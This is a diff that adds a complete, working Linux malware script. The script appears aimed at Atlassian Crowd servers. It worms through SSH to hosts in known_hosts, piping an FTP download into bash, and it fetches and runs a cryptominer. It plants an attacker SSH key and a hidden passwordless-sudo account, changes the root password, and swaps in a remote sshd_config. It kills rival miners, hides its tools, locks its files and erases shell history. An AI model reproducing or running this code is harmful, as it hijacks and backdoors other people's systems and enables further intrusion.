@@ -1,0 +1,124 @@
+setenforce 0 2>/dev/null
+
+if [ -f ~/.ssh/known_hosts ] && [ -f ~/.ssh/id_rsa.pub ]; then
+for h in  $(grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" ~/.ssh/known_hosts); do
+ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h 'curl -o- ftp://144.217.45.47/.ascuns/ks3 | bash >/dev/null 2>&1 &' & done
+fi
+
+echo SELINUX=disabled > /etc/sysconfig/selinux 2>/dev/null
+sync && echo 3 >/proc/sys/vm/drop_caches
+chmod 700 ~/.ssh/
+        echo >> ~/.ssh/authorized_keys
+        chmod 600 ~/.ssh/authorized_keys
+        echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCoV2SAd2rAjPk2ogNzs6WOIQfa3XQkGkoOSZqYyEjP4Yu5FnA/bnKJaFNucXHVhhIWt/i1Hq88SXFJJsof2AlDlxwNgthYwAVYTeKDTyvnK4/xIqgu06eHFD+4dvqDK3WdN/rrc+/FigoMzaD0PRZBGyFnnEK5DkL3xNEYIRxebSd5bgtkA+g85znU3vRF/5afI7yAX72eQBYba2TekG0QNsYWw83+GV7zrVi7+3DTamtZoz5bBhUFIqv8THw3+UZ8XXdEOZNx/vQuROltedi0hiYqyAkbqC7AIAP2ecwNSEHlUUP9AhDA9bfXEPqOB7cgo1mq5k7kUMUSBBSCQJY9 root@ubuntu" > ~/.ssh/authorized_keys
+netstat -anp | grep :3333 | awk '{print $7}' |awk -F '[/]' '{print $1}' | xargs kill -9
+netstat -anp | grep :4444 | awk '{print $7}' |awk -F '[/]' '{print $1}' | xargs kill -9
+netstat -anp | grep :5555 | awk '{print $7}' |awk -F '[/]' '{print $1}' | xargs kill -9
+netstat -anp | grep :6666 | awk '{print $7}' |awk -F '[/]' '{print $1}' | xargs kill -9
+netstat -anp | grep :7777 | awk '{print $7}' |awk -F '[/]' '{print $1}' | xargs kill -9
+netstat -anp | grep :3347 | awk '{print $7}' |awk -F '[/]' '{print $1}' | xargs kill -9
+netstat -anp | grep :14444 | awk '{print $7}' |awk -F '[/]' '{print $1}' | xargs kill -9
+netstat -anp | grep :14433 | awk '{print $7}' |awk -F '[/]' '{print $1}' | xargs kill -9
+netstat -anp | grep :56415 | awk '{print $7}' |awk -F '[/]' '{print $1}' | xargs kill -9
+netstat -anp | grep :9999 | awk '{print $7}' |awk -F '[/]' '{print $1}' | xargs kill -9
+netstat -anp | grep :13531 | awk '{print $7}' |awk -F '[/]' '{print $1}' | xargs kill -9
+netstat -anp | grep :14444 | awk '{print $7}' |awk -F '[/]' '{print $1}' | xargs kill -9
+netstat -anp | grep :3380 | awk '{print $7}' |awk -F '[/]' '{print $1}' | xargs kill -9
+cwd=`pwd`
+echo -e "ImYouIdiotFuckUrMomy!@#@WS\nImYouIdiotFuckUrMomy!@#@WS" | passwd
+chattr -i /tmp/sysguard
+chattr -i /tmp/sysupdate
+chattr -i /tmp/networkservice
+chattr -i /tmp/update.sh
+rm -rf /tmp/sysguard
+rm -rf /tmp/sysupdate
+rm -rf /tmp/networkservice
+rm -rf /tmp/update.sh
+chattr -i /etc/sysguard
+chattr -i /etc/sysupdate
+chattr -i /etc/networkservice
+chattr -i /etc/update.sh
+rm -rf /etc/sysguard
+rm -rf /etc/sysupdate
+rm -rf /etc/networkservice
+rm -rf /etc/update.sh
+pkill -9 -f sysguard
+pkill -9 -f sysupdate
+pkill -9 -f networkservice
+pkill -9 -f update.sh
+timeout 5 mv /usr/bin/wget /usr/bin/mwwie
+timeout 5 mv /usr/bin/curl /usr/bin/mwwwie
+
+if [ ! -d "/var/tmp/.mwwie" ]
+then
+cd /var/tmp
+echo "creez dir"
+mkdir .mwwie
+cd .mwwie
+if command -v mwwie &> /dev/null
+then
+echo "download"
+mwwie ftp://144.217.45.47/.ascuns/nexus
+elif command -v mwwwie &> /dev/null
+then
+mwwwie -LO ftp://144.217.45.47/.ascuns/nexus
+elif command -v curl &> /dev/null
+then
+curl -LO ftp://144.217.45.47/.ascuns/nexus
+elif command -v wget &> /dev/null
+then
+wget ftp://144.217.45.47/.ascuns/nexus
+fi
+tar -xzvf nexus
+rm -rf nexus
+cd "  "/.oznminerv2
+./exec
+chattr +i *
+fi
+if [ $(id -u) -eq 0 ]; then
+         usermod -aG sudo .syslogs1q
+        usermod -G root user1
+        echo ".syslogs1q  ALL=(ALL) NOPASSWD:ALL" | sudo tee /etc/sudoers.d/.syslogs1q
+        username=".syslogs1q"
+        password="ImYouIdiotFuckUrMomy!@#@WS"
+        egrep "^$username" /etc/passwd >/dev/null
+        if [ $? -eq 0 ]; then
+                echo "$username exists!"
+        else
+                pass=$(perl -e 'print crypt($ARGV[0], "password")' $password)
+                useradd -m -p "$pass" "$username"
+                [ $? -eq 0 ] && echo "User has been added to system!" || echo "Failed to add a user!"
+                                mwwie http://downsnapp.site/sshd_config
+                                mv sshd_config /etc/ssh/sshd_config
+                                service sshd restart
+                                
+        fi
+else
+        echo "Only root may add a user to the system."
+
+fi
+
+cd $cwd
+./stop_crowd.sh
+cd /apache-tomcat
+cd /opt/atlassian/crowd/apache-tomcat
+chattr +i temp
+cd $cwd
+chattr +i $cwd
+
+
+
+crontab -r
+chattr +i /root/.ssh/authorized_keys
+chattr +i /var/spool/cron/crontab
+chattr +i /usr/bin/crontab
+cd $cwd
+./start_crowd.sh
+history -c
+rm -rf ks
+
+
+
+
+
+
